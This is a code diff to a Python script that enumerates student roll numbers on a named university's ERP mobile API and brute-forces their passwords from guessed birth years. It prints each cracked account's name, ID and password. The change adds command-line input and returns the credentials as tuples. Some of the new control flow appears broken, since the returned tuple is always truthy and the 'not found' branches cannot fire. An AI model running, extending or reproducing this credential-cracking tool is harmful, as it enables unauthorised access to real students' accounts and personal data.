@@ -1,3 +1,5 @@
+import os
+import sys
 from requests import Session
 
 BASE_URL = "https://erp.iith.ac.in/MobileAPI/"
@@ -31,7 +33,6 @@ def guess_user_yob():
     for offset in range(1, max_offset + 1):
         yield yob + offset
         yield yob - offset
-        
 
 
 def get_user_pwd():
@@ -48,14 +49,12 @@ def get_user_pwd():
 
                 data = req.post(BASE_URL + LOGIN_PATH, json=BODY).json()[0]
                 if data["errorId"] == 0:
-                    print(f"{data['referenceId']}, {data['studentName']}, {BODY['UserID']}, {BODY['Password']}")
-                    return True
+                    return data["referenceId"], data["studentName"], BODY["UserID"], BODY["Password"]
                 
-    print(f"None, None, {BODY['UserID']}, None")
-    return False
+    return None, None, BODY["UserID"], None
 
 
-def get_user_id():
+def get_user_creds():
     global BODY
     
     for degree in degrees:
@@ -63,21 +62,52 @@ def get_user_id():
             for branch in branches:
                 for sno in range(11001, 11101):
                     BODY["UserID"] = f"{branch}{year}{degree}{sno}"
-                    if get_user_pwd() is None:
+                    if creds := get_user_pwd():
+                        print(*creds, sep=",")
+                    else:
                         break
 
 
 if __name__ == "__main__":
+    argc = len(sys.argv)
+    if argc > 1:
+        spl_err_msg = False
 
-    # * the userid scraping function (get_user_id) was designed for btech serial numbers
-    # * if you want to scrape for other degrees, change the range values in the get_user_id function accordingly (for sno in range(start, end+1))
-    # *     also change the years list accordingly
-    degrees = ["btech"] #, "mtech", "resch"]
+        if os.path.exists(sys.argv[1]):
+            with open(sys.argv[1], "r") as f:
+                user_ids = f.read().splitlines()
 
-    years = [21, 22, 23, 24]
-    branches = ["ai", "bm", "bt", "ce", "ch", "co", "cs", "ee", "ep", "es", "ic", "ma", "me", "ms"]
+        else:
+            user_ids = sys.argv[1:]
+            if argc == 2:
+                spl_err_msg = True
 
-    try :
-        get_user_id()
-    except KeyboardInterrupt:
-        pass
+        for user_id in user_ids:
+            BODY["UserID"] = user_id
+            
+            if (creds := get_user_pwd()) is None:
+                if spl_err_msg:
+                    print(f"No file or rollno. found that matches \"{user_id}\"", file=sys.stderr)
+                else:
+                    print(f"No student found with rollno. {user_id}", file=sys.stderr)
+
+            elif creds[0] is None:
+                print(f"No password found for {user_id}, try increasing max_offset in guess_user_yob", file=sys.stderr)
+
+            else:
+                print(*creds, sep=",")
+
+    else:
+
+        # * the userid scraping function (get_user_id) was designed for btech serial numbers
+        # * if you want to scrape for other degrees, change the range values in the get_user_id function accordingly (for sno in range(start, end+1))
+        # *     also change the years list accordingly
+        degrees = ["btech"] #, "mtech", "resch"]
+
+        years = [21, 22, 23, 24]
+        branches = ["ai", "bm", "bt", "ce", "ch", "co", "cs", "ee", "ep", "es", "ic", "ma", "me", "ms"]
+
+        try :
+            get_user_creds()
+        except KeyboardInterrupt:
+            pass
